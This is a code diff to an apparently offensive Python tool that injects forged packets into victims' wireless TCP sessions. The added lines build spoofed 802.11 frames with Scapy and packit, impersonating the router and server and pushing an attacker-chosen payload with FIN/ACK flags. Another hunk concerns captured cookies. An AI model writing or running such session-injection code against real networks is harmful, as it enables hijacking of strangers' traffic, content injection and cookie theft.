@@ -290,6 +290,11 @@ class Injector:
 				sendp(packet,iface=self.interface,verbose=0)
 			except:
 				raise
+			packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
+			try:
+				sendp(packet,iface=self.interface,verbose=0)
+			except:
+				raise
 		else:
 			## MEASURED THIS, TAKES ABOUT 1.45ms TO DO THIS FOR A 195 LINE INJECTION (WHICH IS BIG), ballsy FROM EXAMPLES TAKES 0.1ms ON AVERAGE SO IT'S PRETTY IRRELEVANT TIME-WISE
 			k=binascii.hexlify(injection)
@@ -299,6 +304,10 @@ class Injector:
 				inject+=item+" "
 			injection=inject
 			cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F PA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
+			cmd+=injection
+			cmd+='" >/dev/null 2>&1 &'
+			os.system(cmd)
+			cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F FA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
 			cmd+=injection
 			cmd+='" >/dev/null 2>&1 &'
 			os.system(cmd)
@@ -422,7 +431,7 @@ class PacketHandler:
 			try:
 				k=cookie[1]
 			except:
-				print cookie
+#				print cookie
 				cookie=["NONE","NONE"]
 			if (cookie[1] is not None):
 				exists=0
